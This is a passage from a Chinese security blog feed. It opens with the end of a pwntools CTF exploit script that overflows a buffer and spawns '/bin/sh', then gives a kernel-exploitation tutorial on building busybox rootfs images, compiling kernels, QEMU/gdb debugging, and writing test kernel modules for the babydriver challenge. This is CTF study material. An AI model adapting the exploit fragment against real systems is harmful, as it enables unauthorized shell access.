class="line">    sla(<span class="string">b&#x27;Quit\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    payload=cyclic(<span class="number">0x10</span>)+<span class="string">b&#x27;\x30&#x27;</span></span><br><span class="line">    sla(<span class="string">b&#x27;rname:&#x27;</span>,payload)</span><br><span class="line">    sla(<span class="string">b&#x27;Quit\n&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">59</span>,<span class="string">b&#x27;a&#x27;</span>))</span><br><span class="line">    io.interactive()</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    io.close()</span><br></pre></td></tr></table></figure><p><img src="/2023/08/10/2023-securinets-ctf/image-20230810222406110.png" alt="image-20230810222406110"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Kernel Pwn 基础</title>
      <link href="/2023/08/08/first-kernelpwn/"/>
      <url>/2023/08/08/first-kernelpwn/</url>
      
        <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>以<a href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/kernel/CISCN2017-babydriver/babydriver.tar">CISCN2017-babydriver</a>为例</p><h3 id="busybox文件系统"><a href="#busybox文件系统" class="headerlink" title="busybox文件系统"></a><a href="https://zh.wikipedia.org/wiki/BusyBox">busybox文件系统</a></h3><p>简单的文件系统，提供基本用户环境，如一些常用命令和工具</p><p><a href="https://www.busybox.net/">https://www.busybox.net/</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make menuconfig</span><br></pre></td></tr></table></figure><p>将busybox编译为静态链接的文件</p><p><img src="/2023/08/08/first-kernelpwn/image-20230808234139406.png" alt="image-20230808234139406"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">make -j6</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>编译其他架构busybox</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make -j4 CROSS_COMPILE = 其他架构交叉编译器</span><br></pre></td></tr></table></figure><p>在编译好的文件夹下(默认为_install)</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -p  proc sys dev etc/init.d</span><br></pre></td></tr></table></figure><p>写下init 脚本 chmod +x init </p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">echo &quot;INIT SCRIPT&quot;</span><br><span class="line">mkdir /tmp</span><br><span class="line">mount -t proc none /proc    </span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">echo -e &quot;Boot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds&quot;</span><br><span class="line">insmod /babydriver.ko</span><br><span class="line">setsid /bin/cttyhack setuidgid 0 /bin/sh</span><br></pre></td></tr></table></figure><p>打包脚本</p><p>pack.sh</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">sudo cp -r rootfs rootfs_tmp</span><br><span class="line">sudo cp init rootfs_tmp/</span><br><span class="line">sudo cp babydriver.ko rootfs_tmp/</span><br><span class="line"></span><br><span class="line">sudo chmod +x rootfs_tmp/</span><br><span class="line">sudo chmod g-w -R rootfs_tmp/</span><br><span class="line">sudo chmod o-w -R rootfs_tmp/</span><br><span class="line">sudo chown -R root rootfs_tmp/</span><br><span class="line">sudo chgrp -R root rootfs_tmp/</span><br><span class="line">sudo chmod u+s rootfs_tmp/bin/busybox</span><br><span class="line"></span><br><span class="line">cd rootfs_tmp</span><br><span class="line">sudo mkdir -p  proc sys dev etc/init.d</span><br><span class="line">find . | cpio -o --format=newc &gt; ../rootfs.img</span><br><span class="line">cd ../</span><br><span class="line">sudo rm -rf ./rootfs_tmp</span><br></pre></td></tr></table></figure><p>解包</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cpio -idmv &lt; rootfs.img</span><br></pre></td></tr></table></figure><h3 id="内核"><a href="#内核" class="headerlink" title="内核"></a>内核</h3><h4 id="自己编译内核"><a href="#自己编译内核" class="headerlink" title="自己编译内核"></a>自己编译内核</h4><p><a href="https://www.kernel.org/">https://www.kernel.org/</a></p><p><a href="https://mirrors.tuna.tsinghua.edu.cn/kernel/">https://mirrors.tuna.tsinghua.edu.cn/kernel/</a></p><p><a href="https://cdn.kernel.org/pub/linux/kernel/">https://cdn.kernel.org/pub/linux/kernel/</a></p><p><a href="https://blog.csdn.net/SweeNeil/article/details/88655995">不要在共享目录下来解压kernel，不然会有些符号链接的问题</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make help</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make menuconfig</span><br><span class="line">make -j4 bzImage</span><br></pre></td></tr></table></figure><p>跨平台</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ARCH=平台 CROSS_COMPILE= 其他架构交叉编译器 make -j4 bzImage</span><br></pre></td></tr></table></figure><p>一般按照题目给的内核文件bzImage编译指定版本内核</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/kernel-env&gt; file ./bzImage</span><br><span class="line">./bzImage: Linux kernel x86 boot executable bzImage, version 4.4.72 (atum@ubuntu) #1 SMP Thu Jun 15 19:52:50 PDT 2017, RO-rootFS, swap_dev 0X6, Normal VGA</span><br></pre></td></tr></table></figure><p><a href="https://cdn.kernel.org/pub/linux/kernel/v4.x/linux-4.4.72.tar.gz">https://cdn.kernel.org/pub/linux/kernel/v4.x/linux-4.4.72.tar.gz</a></p><p>确定一下gcc版本,防止一些不必要的问题</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/kernel-env&gt; strings ./bzImage | grep &#x27;gcc&#x27;</span><br><span class="line">4.4.72 (atum@ubuntu) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #1 SMP Thu Jun 15 19:52:50 PDT 2017</span><br></pre></td></tr></table></figure><p>自己编译时遇到的问题</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/k/linux-4.4.42&gt; make menuconfig</span><br><span class="line">  HOSTCC  scripts/kconfig/mconf.o</span><br><span class="line">In file included from scripts/kconfig/mconf.c:23:0:</span><br><span class="line">scripts/kconfig/lxdialog/dialog.h:38:20: fatal error: curses.h: No such file or directory</span><br><span class="line">compilation terminated.</span><br><span class="line">scripts/Makefile.host:108: recipe for target &#x27;scripts/kconfig/mconf.o&#x27; failed</span><br><span class="line">make[1]: *** [scripts/kconfig/mconf.o] Error 1</span><br><span class="line">Makefile:542: recipe for target &#x27;menuconfig&#x27; failed</span><br><span class="line">make: *** [menuconfig] Error 2</span><br><span class="line">解决</span><br><span class="line">sudo apt-get install libncurses5-dev</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scripts/sign-file.c:23:30: fatal error: openssl/opensslv.h: No such file or directory</span><br><span class="line">compilation terminated.</span><br><span class="line">scripts/Makefile.host:91: recipe for target &#x27;scripts/sign-file&#x27; failed</span><br><span class="line">make[1]: *** [scripts/sign-file] Error 1</span><br><span class="line">make[1]: *** Waiting for unfinished jobs....</span><br><span class="line">  HOSTCC  arch/x86/tools/relocs_common.o</span><br><span class="line">  HOSTLD  arch/x86/tools/relocs</span><br><span class="line">Makefile:556: recipe for target &#x27;scripts&#x27; failed</span><br><span class="line">make: *** [scripts] Error 2</span><br><span class="line">make: *** Waiting for unfinished jobs....</span><br><span class="line">解决</span><br><span class="line">grxer@Ubuntu16 /m/h/s/k/linux-4.4.42&gt;  sudo apt-get install libssl-dev </span><br></pre></td></tr></table></figure><p>编译成功</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Setup is 17404 bytes (padded to 17408 bytes).</span><br><span class="line">System is 6820 kB</span><br><span class="line">CRC df8a19f</span><br><span class="line">Kernel: arch/x86/boot/bzImage is ready  (#1)</span><br></pre></td></tr></table></figure><p>两个比较重要的文件就是</p><ul><li>bzImage：<code>arch/x86/boot/bzImage</code></li><li>vmlinux：用来调试</li></ul><p>内核镜像详细介绍: <a href="https://gohalo.me/post/kernel-compile.html">https://gohalo.me/post/kernel-compile.html</a></p><h4 id="下载现有内核镜像"><a href="#下载现有内核镜像" class="headerlink" title="下载现有内核镜像"></a>下载现有内核镜像</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt search linux-image- </span><br><span class="line">sudo apt download xxxxx</span><br><span class="line">dpkg -X xxxx extract</span><br><span class="line">./boot/xxx-generic即为bzImage内核镜像文件</span><br></pre></td></tr></table></figure><h4 id="系统内核镜像"><a href="#系统内核镜像" class="headerlink" title="系统内核镜像"></a>系统内核镜像</h4><p>&#x2F;boot&#x2F;目录下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~&gt; ll -a /boot</span><br><span class="line">total 177M</span><br><span class="line">drwxr-xr-x  4 root root 4.0K  7月 12 09:06 .</span><br><span class="line">drwxr-xr-x 20 root root 4.0K  7月 28 15:44 ..</span><br><span class="line">-rw-r--r--  1 root root 264K  6月  7 22:23 config-5.19.0-45-generic</span><br><span class="line">-rw-r--r--  1 root root 264K  6月 21 22:38 config-5.19.0-46-generic</span><br><span class="line">drwx------  3 root root 4.0K  1月  1  1970 efi</span><br><span class="line">drwxr-xr-x  6 root root 4.0K  7月 12 09:05 grub</span><br><span class="line">lrwxrwxrwx  1 root root   28  7月 12 09:03 initrd.img -&gt; initrd.img-5.19.0-46-generic</span><br><span class="line">-rw-r--r--  1 root root  70M  7月 12 09:04 initrd.img-5.19.0-45-generic</span><br><span class="line">-rw-r--r--  1 root root  70M  7月 12 09:04 initrd.img-5.19.0-46-generic</span><br><span class="line">lrwxrwxrwx  1 root root   28  7月 12 09:03 initrd.img.old -&gt; initrd.img-5.19.0-45-generic</span><br><span class="line">-rw-r--r--  1 root root 179K  2月  7  2022 memtest86+.bin</span><br><span class="line">-rw-r--r--  1 root root 181K  2月  7  2022 memtest86+.elf</span><br><span class="line">-rw-r--r--  1 root root 181K  2月  7  2022 memtest86+_multiboot.bin</span><br><span class="line">-rw-------  1 root root 6.2M  6月  7 22:23 System.map-5.19.0-45-generic</span><br><span class="line">-rw-------  1 root root 6.2M  6月 21 22:38 System.map-5.19.0-46-generic</span><br><span class="line">lrwxrwxrwx  1 root root   25  7月 12 09:03 vmlinuz -&gt; vmlinuz-5.19.0-46-generic</span><br><span class="line">-rw-------  1 root root  12M  6月  7 22:23 vmlinuz-5.19.0-45-generic</span><br><span class="line">-rw-------  1 root root  12M  6月 21 22:43 vmlinuz-5.19.0-46-generic</span><br><span class="line">lrwxrwxrwx  1 root root   25  7月 12 09:03 vmlinuz.old -&gt; vmlinuz-5.19.0-45-generic</span><br><span class="line">grxer@Ubuntu22 ~&gt; <span class="built_in">uname</span> -r</span><br><span class="line">5.19.0-46-generic</span><br><span class="line">grxer@Ubuntu22 ~&gt; sudo file /boot/vmlinuz-5.19.0-46-generic</span><br><span class="line">[sudo] password <span class="keyword">for</span> grxer:</span><br><span class="line">/boot//vmlinuz-5.19.0-46-generic: Linux kernel x86 boot executable bzImage, version 5.19.0-46-generic (buildd@lcy02-amd64-025) <span class="comment">#47~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 21 15:35:31 UTC 2, RO-rootFS, swap_dev 0XB, Normal VGA</span></span><br></pre></td></tr></table></figure><p>vmlinuz-5.19.0-46-generic 内核</p><p>initrd.img-5.19.0-46-generic 引导文件</p><h3 id="启动内核"><a href="#启动内核" class="headerlink" title="启动内核"></a>启动内核</h3><p>start.sh</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m <span class="number">64</span>M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd  ./rootfs.img \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr&quot;</span> \</span><br><span class="line">    -smp cores=<span class="number">2</span>,threads=<span class="number">1</span> \</span><br><span class="line">    -cpu kvm64</span><br></pre></td></tr></table></figure><ul><li><code>-m</code>：虚拟机内存大小</li><li><code>-nographic</code>：以非图形界面模式运行虚拟机</li><li><code>-kernel</code>：指定内核镜像文件</li><li><code>initrd</code>：指定初始RAM磁盘镜像文件</li><li><code>append</code>：设置内核启动附加参数</li><li><code>smp</code>:设置虚拟机的处理器拓扑，此处使用 2 个核心和 1 个线程</li><li><code>cpu</code>:设置CPU安全选项</li></ul><h3 id="调试内核"><a href="#调试内核" class="headerlink" title="调试内核"></a>调试内核</h3><p>启动脚本里关掉aslr</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr&quot; \</span><br></pre></td></tr></table></figure><p>开启调试接口</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">启动参数中添加  -gdb dev，如-gdb tcp::1234 可简写为-s 如果希望 qemu 启动后立即挂起，额外添加-S参数</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">~ # lsmod</span><br><span class="line">babydriver 16384 0 - Live 0xffffffffc0000000 (OE)</span><br><span class="line">~ # find /sys/| grep babydriver</span><br><span class="line">/sys/module/babydriver</span><br><span class="line">/sys/module/babydriver/srcversion</span><br><span class="line">/sys/module/babydriver/notes</span><br><span class="line">/sys/module/babydriver/notes/.note.gnu.build-id</span><br><span class="line">/sys/module/babydriver/taint</span><br><span class="line">/sys/module/babydriver/initstate</span><br><span class="line">/sys/module/babydriver/coresize</span><br><span class="line">/sys/module/babydriver/sections</span><br><span class="line">/sys/module/babydriver/sections/.bss</span><br><span class="line">/sys/module/babydriver/sections/.init.text</span><br><span class="line">/sys/module/babydriver/sections/.data</span><br><span class="line">/sys/module/babydriver/sections/.text</span><br><span class="line">/sys/module/babydriver/sections/__mcount_loc</span><br><span class="line">/sys/module/babydriver/sections/.strtab</span><br><span class="line">/sys/module/babydriver/sections/.symtab</span><br><span class="line">/sys/module/babydriver/sections/.gnu.linkonce.this_module</span><br><span class="line">/sys/module/babydriver/sections/.rodata.str1.1</span><br><span class="line">/sys/module/babydriver/sections/.note.gnu.build-id</span><br><span class="line">/sys/module/babydriver/sections/.exit.text</span><br><span class="line">/sys/module/babydriver/refcnt</span><br><span class="line">/sys/module/babydriver/uevent</span><br><span class="line">/sys/module/babydriver/holders</span><br><span class="line">/sys/module/babydriver/initsize</span><br><span class="line">~ # cat /sys/module/babydriver/sections/.text</span><br><span class="line">0xffffffffc0000000</span><br><span class="line">~ $ cat /sys/module/babydriver/sections/.bss</span><br><span class="line">0xffffffffc0002440</span><br><span class="line">~ $ cat /sys/module/babydriver/sections/.data</span><br><span class="line">0xffffffffc0002000</span><br></pre></td></tr></table></figure><p>gdb.sh</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">sudo gdb -q \</span><br><span class="line">      -ex &quot;file vmlinux&quot;\</span><br><span class="line">    -ex &quot;add-symbol-file babydriver.ko 0xffffffffc0000000 -s .data 0xffffffffc0002000 -s .bss 0xffffffffc0002440&quot;\</span><br><span class="line">    -ex &quot;target remote localhost:1234&quot;\</span><br><span class="line">    -ex &quot;b babyopen&quot; </span><br></pre></td></tr></table></figure><h2 id="Loadable-Kernel-Modules（LKMs）"><a href="#Loadable-Kernel-Modules（LKMs）" class="headerlink" title="Loadable Kernel Modules（LKMs）"></a>Loadable Kernel Modules（LKMs）</h2><p>Linux Kernle采用的是宏内核架构，一切的系统服务都需要由内核来提供，效率较高，但是缺乏可扩展性与可维护性，然后就有了<strong>可装载内核模块</strong>（<strong>Loadable Kernel Modules</strong>，简称<strong>LKMs</strong>，LKMs可以提供<strong>新的系统调用</strong>或其他服务，驱动等，LKMs是ELF文件格式，运行在内核</p><blockquote><p>微内核架构就相对安全，宏内核里一个设备失控，危机整个内核，微内核只能危机提供该系统服务的进程</p><p>jyy老师有讲到哇: <a href="https://jyywiki.cn/OS/2022/slides/21.slides.html#/2">https://jyywiki.cn/OS/2022/slides/21.slides.html#/2</a></p></blockquote><ul><li><code>lsmod</code>：列出现有的LKMs</li><li><code>insmod</code>：装载新的LKM（需要root）</li><li><code>rmmod</code>：从内核中移除LKM（需要root）、</li><li><code>modprobe</code>: 添加或删除模块，modprobe 在加载模块时会查找依赖关系</li></ul><p>一般ctf就是分析这个文件，了解一下程序的编写</p><p>在之前下载的源码文件夹下</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir testdrive &amp; cd testdrive</span><br></pre></td></tr></table></figure><p>kotest.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ko_test_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  printk(<span class="string">&quot;This is a test ko!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">ko_test_exit</span><span class="params">(<span class="type">void</span>)</span> &#123; printk(<span class="string">&quot;Bye Bye~\n&quot;</span>); &#125;</span><br><span class="line">module_init(ko_test_init);<span class="comment">//模块入口函数 加载时执行</span></span><br><span class="line">module_exit(ko_test_exit);<span class="comment">//模块出口函数 卸载时执行</span></span><br></pre></td></tr></table></figure><p>Makefile</p><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">obj-m += ko_test.o</span><br><span class="line"></span><br><span class="line">KDIR =/home/grxer/kernel-env/linux-4.4.72/</span><br><span class="line"></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">    <span class="variable">$(MAKE)</span> -C <span class="variable">$(KDIR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">    rm -rf *.o *.ko *.mod.* *.symvers *.order</span><br></pre></td></tr></table></figure><ul><li><code>obj-m</code>： 指定了编译的结果应当为可装载内核模块，指定要声称哪些模块</li><li><code>KDIR</code> 用来标识内核源码目录，提供驱动编译所需环境</li><li><code>-C</code> 表示进入到指定的内核目录</li><li><code>M</code> 指定驱动源码的环境，使 Makefile 在构建模块之前返回到 驱动源码 目录，并在该目录中生成驱动模块</li></ul><p>make</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 ~/k/l/testdrive&gt; make</span><br><span class="line">make -C /home/grxer/kernel-env/linux<span class="number">-4.4</span><span class="number">.72</span>/ M=/home/grxer/kernel-env/linux<span class="number">-4.4</span><span class="number">.72</span>/testdrive modules</span><br><span class="line">make[<span class="number">1</span>]: Entering directory <span class="string">&#x27;/home/grxer/kernel-env/linux-4.4.72&#x27;</span></span><br><span class="line">  CC [M]  /home/grxer/kernel-env/linux<span class="number">-4.4</span><span class="number">.72</span>/testdrive/ko_test.o</span><br><span class="line">  Building modules, stage <span class="number">2.</span></span><br><span class="line">  MODPOST <span class="number">1</span> modules</span><br><span class="line">  CC      /home/grxer/kernel-env/linux<span class="number">-4.4</span><span class="number">.72</span>/testdrive/ko_test.mod.o</span><br><span class="line">  LD [M]  /home/grxer/kernel-env/linux<span class="number">-4.4</span><span class="number">.72</span>/testdrive/ko_test.ko</span><br><span class="line">make[<span class="number">1</span>]: Leaving directory <span class="string">&#x27;/home/grxer/kernel-env/linux-4.4.72&#x27;</span></span><br><span class="line">grxer@Ubuntu16 ~/k/l/testdrive&gt; ls</span><br><span class="line">ko_test.c*  ko_test.mod.c  ko_test.o  modules.order</span><br><span class="line">ko_test.ko  ko_test.mod.o  Makefile*  Module.symvers</span><br></pre></td></tr></table></figure><blockquote><p>这里的gcc尽量还是之前确定的那个gcc</p></blockquote><p>ko_test.ko复制到文件系统根目录，然后在init装载新的LKM，重新打包</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">insmod /ko_test.ko</span><br></pre></td></tr></table></figure><p>开机后dmesg就可以看到了</p><p><img src="/2023/08/08/first-kernelpwn/image-20230814231519956.png" alt="image-20230814231519956"></p><h3 id="杂项字符设备"><a href="#杂项字符设备" class="headerlink" title="杂项字符设备"></a><a href="https://www.cnblogs.com/ggzhangxiaochao/p/12894883.html">杂项字符设备</a></h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">注册：<span class="type">int</span> <span class="title function_">misc_register</span><span class="params">(<span class="keyword">struct</span> miscdevice *misc)</span></span><br><span class="line">释放：<span class="type">int</span> <span class="title function_">misc_deregister</span><span class="params">(<span class="keyword">struct</span> miscdevice *misc)</span></span><br></pre></td></tr></table></figure><p>misc_register注册杂项字符设备，该类设备使用同一个主设备号10,会自动创建设备节点，即设备文件。无需mknod指令创建设备文件。因为misc_register()会调用class_device_creat或者device_creat().</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">miscdevice</span>  &#123;</span></span><br><span class="line">    <span class="type">int</span> minor;<span class="comment">//次设备号,一般使用 MISC_DYNAMIC_MINOR 宏来使用动态分配的次设备号</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;<span class="comment">//字符设备的名称</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">fops</span>;</span><span class="comment">//指向字符设备操作函数集的指针</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">class_device</span> *<span class="keyword">class</span>;</span></span><br><span class="line">    <span class="type">char</span> devfs_name[<span class="number">64</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><a href="https://elixir.bootlin.com/linux/v5.5-rc2/source/include/linux/fs.h#L1821">file_operations</a>结构体成员基本上都是函数指针，可以通过修改其中的函数指针来达到重写某个函数的目的，如果对这个驱动调用某个其中的函数，就会调用结构体中的函数指针</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/miscdevice.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">misc_ioctl</span><span class="params">(<span class="keyword">struct</span> file* file, <span class="type">unsigned</span> <span class="type">int</span> request,  <span class="type">size_t</span> arg)</span> &#123;</span><br><span class="line">  <span class="keyword">switch</span> (request)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x666</span>:</span><br><span class="line">    printk(<span class="string">&quot;0x666\n&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x888</span>:</span><br><span class="line">    printk(<span class="string">&quot;0x888\n&quot;</span>); </span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">dev_fops</span> =</span> &#123;</span><br><span class="line">  .owner = THIS_MODULE,</span><br><span class="line">  .unlocked_ioctl = misc_ioctl,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">miscdevice</span> <span class="title">test_misc</span> =</span> &#123;</span><br><span class="line">  .minor = MISC_DYNAMIC_MINOR,</span><br><span class="line">  .name = <span class="string">&quot;testmisc&quot;</span>,</span><br><span class="line">  .fops = &amp;dev_fops,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">ko_test_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  printk(<span class="string">&quot;This is a test ko!\n&quot;</span>);</span><br><span class="line">  <span class="type">int</span> err = misc_register(&amp;test_misc);</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    printk(<span class="string">&quot;envctrl: Unable to get misc minor %d/n&quot;</span>,test_misc.minor);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">ko_test_exit</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  printk(<span class="string">&quot;Bye Bye~\n&quot;</span>);</span><br><span class="line">  misc_deregister(&amp;test_misc);</span><br><span class="line">&#125;</span><br><span class="line">module_init(ko_test_init);</span><br><span class="line">module_exit(ko_test_exit);</span><br></pre></td></tr></table></figure><p><strong>重写了驱动的ioctl函数</strong></p><blockquote><p>32位的APP运行在64位的kernel上，调用的是<strong>compat_ioctl</strong></p><p>64位的用户程序运行在64位的kernel上，调用的是<strong>unlocked_ioctl</strong>，如果是32位的APP运行在32位的kernel上，调用的也是<strong>unlocked_ioctl</strong></p><p>jyy老师有讲哇: <a href="https://jyywiki.cn/OS/2022/slides/25.slides.html#/2/4">https://jyywiki.cn/OS/2022/slides/25.slides.html#/2/4</a></p></blockquote><p>用户态测试程序</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="type">int</span> fd=open(<span class="string">&quot;/dev/testmisc&quot;</span>,O_RDONLY);</span><br><span class="line">  <span class="keyword">if</span>(<span class="number">-1</span>==fd)&#123;</span><br><span class="line">    perror(<span class="string">&quot;open error&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> res=ioctl(fd, <span class="number">0x666</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;res:%d\n&quot;</span>,res);</span><br><span class="line">  res=ioctl(fd, <span class="number">0x888</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;res:%d\n&quot;</span>,res);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="内核防护"><a href="#内核防护" class="headerlink" title="内核防护"></a>内核防护</h2><h3 id="KASLR"><a href="#KASLR" class="headerlink" title="KASLR"></a>KASLR</h3><p>kernel address space layout randomize 内核空间地址随机化</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu开启smep -append ”kaslr“</span><br><span class="line">    关闭   -append ”nokaslr“</span><br></pre></td></tr></table></figure><h3 id="FGKASLR"><a href="#FGKASLR" class="headerlink" title="FGKASLR"></a>FGKASLR</h3><p>FGKASLR 在KASLR基地址随机化的基础上，在加载时刻，以函数粒度重新排布内核代码</p><h3 id="STACK-PROTECTOR"><a href="#STACK-PROTECTOR" class="headerlink" title="STACK PROTECTOR"></a>STACK PROTECTOR</h3><p>类似于用户态程序的 canary,x86 架构下 Canary 实现的特点是同一个 task 共享 Canary</p><p>内核中的 canary 的值通常取自 gs 段寄存器某个固定偏移处的值</p><h3 id="SMEP-x2F-SMAP"><a href="#SMEP-x2F-SMAP" class="headerlink" title="SMEP&#x2F;SMAP"></a>SMEP&#x2F;SMAP</h3><p><img src="/2023/08/08/first-kernelpwn/image-20230811154518221.png" alt="image-20230811154518221"></p><p>Supervisor Mode <strong>Execution</strong> Protection 管理模式执行保护 